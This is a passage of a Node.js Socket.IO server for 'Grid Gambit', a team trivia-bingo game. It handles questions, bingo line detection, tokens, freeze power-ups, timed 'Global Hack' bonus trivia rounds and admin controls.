      '1) Roll back the last deployment. 2) Increase RDS instance size. 3) Disable caching entirely.',
      '1) Enable maintenance mode immediately. 2) Restore from database backup. 3) Notify all users.',
    ],
    answer:0 },
];

const HACK_QUESTIONS = [
  { prompt:'Global Hack: git rebase vs merge — which creates a linear history by replaying commits?', options:['git rebase','git merge','git cherry-pick','git stash'], answer:0 },
  { prompt:'Global Hack: In TCP, what does the SYN-SYN/ACK-ACK sequence establish?', options:['A three-way handshake connection','A TLS encrypted tunnel','A DNS resolution','A WebSocket upgrade'], answer:0 },
  { prompt:'Global Hack: What does "idempotent" mean for an HTTP method?', options:['Same request repeated has same effect as once','Request is encrypted','Response is cached permanently','Method requires authentication'], answer:0 },
  { prompt:'Global Hack: In Kubernetes, what does a Liveness probe do?', options:['Restarts container if it becomes unhealthy','Checks if the pod is ready to receive traffic','Monitors resource usage','Scans for security vulnerabilities'], answer:0 },
  { prompt:'Global Hack: What is the purpose of a mutex in concurrent programming?', options:['Ensures only one thread accesses a shared resource at a time','Speeds up memory allocation','Encrypts inter-thread communication','Prevents memory leaks'], answer:0 },
];
let hackIdx = 0;

// ─── Helpers ──────────────────────────────────────────────────────────────────
function shuffle(arr) { const a=[...arr]; for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }

function detectLines(marked) {
  const s=new Set(marked); const lines=[];
  for(let r=0;r<5;r++){const c=[r*5,r*5+1,r*5+2,r*5+3,r*5+4];if(c.every(x=>s.has(x)))lines.push({cells:c,id:`row-${r}`});}
  for(let c=0;c<5;c++){const cs=[c,c+5,c+10,c+15,c+20];if(cs.every(x=>s.has(x)))lines.push({cells:cs,id:`col-${c}`});}
  const d1=[0,6,12,18,24],d2=[4,8,12,16,20];
  if(d1.every(x=>s.has(x)))lines.push({cells:d1,id:'diag-tl'});
  if(d2.every(x=>s.has(x)))lines.push({cells:d2,id:'diag-tr'});
  return lines;
}

function assignPoints(teams) {
  const sorted=[...teams].sort((a,b)=>b.linesCompleted-a.linesCompleted||(a.elapsedSeconds||0)-(b.elapsedSeconds||0));
  sorted.forEach((t,i)=>{t.roundPoints=POINTS_TABLE[Math.min(i,POINTS_TABLE.length-1)];t.totalScore=(t.totalScore||0)+t.roundPoints;});
}

function freshTeamRound(t, round) {
  const qs=shuffle(ALL_QUESTIONS.filter(q=>q.round===round).map(q=>q.id));
  return {...t, board:shuffle(BOARD_PHRASES), cellQueue:shuffle([...Array(25).keys()]),
    questionDeck:qs, currentQuestionIndex:0, attempts:0, correctAnswers:0,
    markedCells:[], lines:[], linesCompleted:0, tokens:TOKENS_PER_ROUND,
    finishedAt:null, lastCorrectAt:null, elapsedSeconds:0, lastAnswerResult:null,
    powerups:[], frozenUntil:null, roundPoints:0};
}

function newTeam(name, color) {
  return freshTeamRound({id:randomUUID(),name:name.trim(),color,joinedAt:Date.now(),totalScore:0,roundScores:[]}, 1);
}

function createInitialState() {
  return {phase:'setup',currentRound:0,startedAt:null,roundStartedAt:null,endedAt:null,
    roundDurationMinutes:ROUND_DURATION_MIN,autoEndOnWinner:true,leaderboardVisible:true,
    teams:[],announcements:[],roundWinners:{},globalHack:null,adminCode:ADMIN_CODE};
}

function loadState() {
  if(!existsSync(stateFile))return createInitialState();
  try{return{...createInitialState(),...JSON.parse(readFileSync(stateFile,'utf8'))};}
  catch{return createInitialState();}
}

function saveState(){mkdirSync(dataDir,{recursive:true});writeFileSync(stateFile,JSON.stringify(state,null,2),'utf8');}

let state=loadState();

function publicState(){
  const now=Date.now();
  return {
    phase:state.phase,currentRound:state.currentRound,totalRounds:TOTAL_ROUNDS,
    startedAt:state.startedAt,roundStartedAt:state.roundStartedAt,endedAt:state.endedAt,
    roundDurationMinutes:state.roundDurationMinutes,autoEndOnWinner:state.autoEndOnWinner,
    leaderboardVisible:state.leaderboardVisible,
    teams:state.teams.map(t=>({
      id:t.id,name:t.name,color:t.color,board:t.board,
      markedCells:t.markedCells,lines:t.lines,linesCompleted:t.linesCompleted,
      currentQuestionIndex:t.currentQuestionIndex,attempts:t.attempts,
      correctAnswers:t.correctAnswers,elapsedSeconds:t.elapsedSeconds,
      tokens:t.tokens,totalScore:t.totalScore||0,roundScores:t.roundScores||[],
      roundPoints:t.roundPoints||0,finishedAt:t.finishedAt,lastCorrectAt:t.lastCorrectAt,
      lastAnswerResult:t.lastAnswerResult,powerups:t.powerups||[],
      isFrozen:!!(t.frozenUntil&&t.frozenUntil>now),frozenUntil:t.frozenUntil,
    })),
    announcements:state.announcements.slice(0,40),
    roundWinners:state.roundWinners,
    globalHack:state.globalHack?{id:state.globalHack.id,prompt:state.globalHack.prompt,
      options:state.globalHack.options,active:state.globalHack.active,solvers:state.globalHack.solvers}:null,
  };
}

function announce(type,title,detail){
  state.announcements.unshift({id:randomUUID(),type,title,detail,at:Date.now()});
  state.announcements=state.announcements.slice(0,40);
}

let timerHandle=null;
function startTimer(){
  if(timerHandle)return;
  timerHandle=setInterval(()=>{
    if(state.phase!=='round_active')return;
    state.teams.forEach(t=>{t.elapsedSeconds++;});
    if((Date.now()-state.roundStartedAt)/60000>=state.roundDurationMinutes){endRound('timeout');return;}
    io.emit('state:tick',{teams:state.teams.map(t=>({id:t.id,elapsedSeconds:t.elapsedSeconds}))});
    if(state.teams[0]?.elapsedSeconds%15===0)saveState();
  },1000);
}
function stopTimer(){if(timerHandle){clearInterval(timerHandle);timerHandle=null;}}
function broadcast(){io.emit('state:update',publicState());saveState();}

function startRound(round){
  state.currentRound=round; state.phase='round_active'; state.roundStartedAt=Date.now();
  state.teams=state.teams.map(t=>freshTeamRound(t,round));
  if(!state.roundWinners[round])state.roundWinners[round]=[];
  announce('round_start',`🎰 Round ${round} of ${TOTAL_ROUNDS} — BEGIN!`,`${state.teams.length} teams · ${ALL_QUESTIONS.filter(q=>q.round===round).length} challenges · ${state.roundDurationMinutes} min`);
  startTimer(); broadcast();
}

function endRound(reason='manual'){
  stopTimer(); state.phase='round_end';
  assignPoints(state.teams);
  state.teams.forEach(t=>{if(!t.roundScores)t.roundScores=[];t.roundScores[state.currentRound-1]=t.roundPoints;});
  const sorted=[...state.teams].sort((a,b)=>b.linesCompleted-a.linesCompleted||a.elapsedSeconds-b.elapsedSeconds);
  const w=sorted[0];
  announce('round_end',`Round ${state.currentRound} Complete`,`${reason==='timeout'?'Time up!':'First to 5 lines!'} ${w?.name} leads · ${w?.linesCompleted} lines · ${w?.roundPoints}pts`);
  if(state.currentRound===TOTAL_ROUNDS)setTimeout(()=>endGame('rounds_complete'),3000);
  broadcast();
}

function startGame({roundDurationMinutes,autoEndOnWinner}){
  if(!state.teams.length)return{error:'No teams added'};
  state.roundDurationMinutes=roundDurationMinutes||ROUND_DURATION_MIN;
  state.autoEndOnWinner=autoEndOnWinner!==false;
  state.startedAt=Date.now(); state.endedAt=null;
  state.roundWinners={}; state.announcements=[]; state.globalHack=null;
  state.teams=state.teams.map(t=>({...t,totalScore:0,roundScores:[]}));
  announce('start','🎰 Grid Gambit Begins!',`${state.teams.length} teams · 3 rounds · May the best team take the grid.`);
  startRound(1); return{ok:true};
}

function endGame(reason='manual'){
  stopTimer(); state.phase='finished'; state.endedAt=Date.now();
  const sorted=[...state.teams].sort((a,b)=>(b.totalScore||0)-(a.totalScore||0));
  announce('end','🏆 Final Results!',`🥇${sorted[0]?.name||'?'} 🥈${sorted[1]?.name||'?'} 🥉${sorted[2]?.name||'?'}`);
  broadcast();
}

function resetGame(){stopTimer();state=createInitialState();broadcast();}
function addTeam(name,color){
  if(!name?.trim())return{error:'Name required'};
  if(state.teams.length>=60)return{error:'Max 60 teams'};
  if(state.teams.find(t=>t.name.toLowerCase()===name.trim().toLowerCase()))return{error:'Team name taken'};
  const team=newTeam(name,color||PALETTE[state.teams.length%PALETTE.length]);
  state.teams.push(team);
  announce('team','New Team',`${team.name} joined the arena.`);
  broadcast(); return{ok:true,team};
}
function removeTeam(id){state.teams=state.teams.filter(t=>t.id!==id);broadcast();}
function toggleLeaderboard(v){state.leaderboardVisible=v;broadcast();}

const submitCooldowns=new Map();

function submitAnswer({teamId,questionId,selectedIndex}){
  if(state.phase!=='round_active')return{accepted:false,reason:'Round not active'};
  const team=state.teams.find(t=>t.id===teamId);
  if(!team)return{accepted:false,reason:'Team not found'};
  if(team.frozenUntil&&team.frozenUntil>Date.now())return{accepted:false,reason:'frozen',frozenUntil:team.frozenUntil};
  const q=ALL_QUESTIONS.find(q=>q.id===questionId);
  if(!q)return{accepted:false,reason:'Unknown question'};

  // TOKEN LOGIC (per PDF): tokens deducted per ATTEMPT, not per correct answer only
  const tokenCost=q.boss?2:1;
  if(team.tokens<tokenCost)return{accepted:false,reason:'no_tokens',tokens:team.tokens};

  const currentQId=team.questionDeck[team.currentQuestionIndex%team.questionDeck.length];
  if(questionId!==currentQId)return{accepted:false,reason:'Stale question'};

  team.attempts++;
  team.tokens=Math.max(0,team.tokens-tokenCost); // tokens deducted regardless of correct/wrong
  const correct=selectedIndex===q.answer;

  if(correct){
    team.correctAnswers++; team.lastCorrectAt=Date.now(); team.lastAnswerResult='correct';
    const nextCell=team.cellQueue[team.markedCells.length];
    if(typeof nextCell==='number'&&!team.markedCells.includes(nextCell))team.markedCells.push(nextCell);
    team.lines=detectLines(team.markedCells); team.linesCompleted=team.lines.length;
    if(q.boss){team.powerups=[...(team.powerups||[]),'freeze'];announce('powerup',`⚡ ${team.name}`,`Boss solved! FREEZE power-up earned.`);}
    if(team.linesCompleted>=LINES_TO_WIN){
      if(!state.roundWinners[state.currentRound])state.roundWinners[state.currentRound]=[];
      if(!state.roundWinners[state.currentRound].includes(team.id)){
        team.finishedAt=Date.now();
        state.roundWinners[state.currentRound].push(team.id);
        announce('winner',`🏆 ${team.name} — BINGO!`,`Round ${state.currentRound}! 5 lines in ${Math.floor(team.elapsedSeconds/60)}m ${team.elapsedSeconds%60}s`);
        if(state.autoEndOnWinner)endRound('winner');
      }
    } else { announce('correct',`✓ ${team.name}`,`Cell marked! ${team.linesCompleted}/${LINES_TO_WIN} lines · ${team.tokens} tokens left`); }
  } else {
    team.lastAnswerResult='wrong';
    announce('miss',`✗ ${team.name}`,`Wrong answer. ${team.tokens} tokens remaining.`);
  }
  team.currentQuestionIndex++;
  broadcast();
  return{accepted:true,correct,newCell:correct?team.markedCells[team.markedCells.length-1]:null,
    linesCompleted:team.linesCompleted,lines:team.lines,tokens:team.tokens,powerups:team.powerups};
}

function getNextQuestion(teamId){
  const team=state.teams.find(t=>t.id===teamId);
  if(!team)return null;
  const qId=team.questionDeck[team.currentQuestionIndex%team.questionDeck.length];
  const q=ALL_QUESTIONS.find(q=>q.id===qId);
  if(!q)return null;
  // Send question WITHOUT the answer field
  return{id:q.id,category:q.category,prompt:q.prompt,options:q.options,boss:q.boss,round:q.round,meta:q.meta||{}};
}

function usePowerup({teamId,type,targetTeamId}){
  const team=state.teams.find(t=>t.id===teamId);
  if(!team)return{error:'Team not found'};
  const idx=(team.powerups||[]).indexOf(type);
  if(idx===-1)return{error:'No such powerup'};
  if(type==='freeze'){
    const target=state.teams.find(t=>t.id===targetTeamId);
    if(!target)return{error:'Target not found'};
    target.frozenUntil=Date.now()+FREEZE_MS;
    team.powerups.splice(idx,1);
    announce('freeze',`❄️ ${team.name} froze ${target.name}!`,`${target.name} frozen for 60 seconds.`);
    broadcast(); return{ok:true};
  }
  return{error:'Unknown powerup'};
}

function triggerGlobalHack(){
  if(state.phase!=='round_active')return{error:'Round not active'};
  const q=HACK_QUESTIONS[hackIdx%HACK_QUESTIONS.length]; hackIdx++;
  state.globalHack={id:randomUUID(),prompt:q.prompt,options:q.options,answer:q.answer,active:true,solvers:[]};
  announce('hack','⚡ GLOBAL HACK EVENT!','First 3 teams to solve get +2 tokens!');
  broadcast();
  setTimeout(()=>{if(state.globalHack?.active){state.globalHack.active=false;announce('hack_end','Hack Event Closed',`${state.globalHack.solvers.length} teams solved it.`);broadcast();}},5*60*1000);
  return{ok:true};
}

function submitHackAnswer({teamId,hackId,selectedIndex}){
  if(!state.globalHack?.active)return{accepted:false,reason:'No active hack'};
  if(state.globalHack.id!==hackId)return{accepted:false,reason:'Stale hack'};
  if(state.globalHack.solvers.includes(teamId))return{accepted:false,reason:'Already solved'};
  if(state.globalHack.solvers.length>=3)return{accepted:false,reason:'Reward claimed'};
  const correct=selectedIndex===state.globalHack.answer;
  if(correct){
    state.globalHack.solvers.push(teamId);
    const team=state.teams.find(t=>t.id===teamId);
    if(team){team.tokens=Math.min(team.tokens+2,20);announce('hack_solve',`⚡ ${team.name} cracked it!`,`+2 tokens! (${state.globalHack.solvers.length}/3)`);}
    if(state.globalHack.solvers.length>=3){state.globalHack.active=false;announce('hack_end','All Hack Rewards Claimed','3 teams earned bonus tokens.');}
    broadcast(); return{accepted:true,correct:true,tokens:team?.tokens};
  }
  return{accepted:true,correct:false};
}

io.on('connection',socket=>{
  socket.emit('state:update',publicState());
  socket.on('client:join',({role}={})=>{socket.join(role==='admin'?'admins':role==='projector'?'projectors':'players');socket.emit('state:update',publicState());});
  const ag=(p,fn)=>{if(p?.adminCode!==ADMIN_CODE){socket.emit('error',{msg:'Invalid admin code'});return;}fn(p);};
  socket.on('admin:startGame',    p=>ag(p,({roundDurationMinutes,autoEndOnWinner})=>{const r=startGame({roundDurationMinutes,autoEndOnWinner});if(r.error)socket.emit('error',{msg:r.error});}));
  socket.on('admin:startRound',   p=>ag(p,({round})=>startRound(round)));
  socket.on('admin:endRound',     p=>ag(p,()=>endRound('admin')));
  socket.on('admin:endGame',      p=>ag(p,()=>endGame('admin')));
  socket.on('admin:reset',        p=>ag(p,()=>resetGame()));
  socket.on('admin:addTeam',      p=>ag(p,({name,color})=>{const r=addTeam(name,color);if(r.error)socket.emit('error',{msg:r.error});}));
  socket.on('admin:removeTeam',   p=>ag(p,({teamId})=>removeTeam(teamId)));
  socket.on('admin:toggleLeaderboard',p=>ag(p,({visible})=>toggleLeaderboard(visible)));
  socket.on('admin:triggerHack',  p=>ag(p,()=>{const r=triggerGlobalHack();if(r.error)socket.emit('error',{msg:r.error});}));
  socket.on('admin:clearAnnouncements',p=>ag(p,()=>{state.announcements=[];broadcast();}));
  socket.on('player:getQuestion',({teamId}={})=>{const q=getNextQuestion(teamId);if(q)socket.emit('question:data',q);});
  socket.on('player:submitAnswer',({teamId,questionId,selectedIndex}={})=>{
    const now=Date.now();const last=submitCooldowns.get(socket.id)||0;
    if(now-last<500)return socket.emit('answer:result',{accepted:false,reason:'Too fast'});
    submitCooldowns.set(socket.id,now);
    const result=submitAnswer({teamId,questionId,selectedIndex});
    socket.emit('answer:result',result);
    if(result.accepted&&result.correct){const nq=getNextQuestion(teamId);if(nq)socket.emit('question:data',nq);}
    // Always send next question after any accepted attempt (correct or wrong)
    else if(result.accepted&&!result.correct){const nq=getNextQuestion(teamId);if(nq)socket.emit('question:data',nq);}
  });
  socket.on('player:usePowerup',({teamId,type,targetTeamId}={})=>{const r=usePowerup({teamId,type,targetTeamId});if(r.error)socket.emit('error',{msg:r.error});});
  socket.on('player:submitHack',({teamId,hackId,selectedIndex}={})=>{const r=submitHackAnswer({teamId,hackId,selectedIndex});socket.emit('hack:result',r);});
  socket.on('disconnect',()=>submitCooldowns.delete(socket.id));
});

app.use(express.json());
app.use((_,res,next)=>{res.header('Access-Control-Allow-Origin','*');res.header('Access-Control-Allow-Headers','Content-Type');next();});
app.get('/health',(_,res)=>res.json({ok:true,phase:state.phase,round:state.currentRound,teams:state.teams.length}));
app.get('/api/state',(_,res)=>res.json(publicState()));

saveState();
if(state.phase==='round_active')startTimer();
server.listen(PORT,()=>{console.log(`\n🎰 Grid Gambit  →  http://localhost:${PORT}\n   Admin: ${ADMIN_CODE} | Phase: ${state.phase} | Round: ${state.currentRound}\n`);});
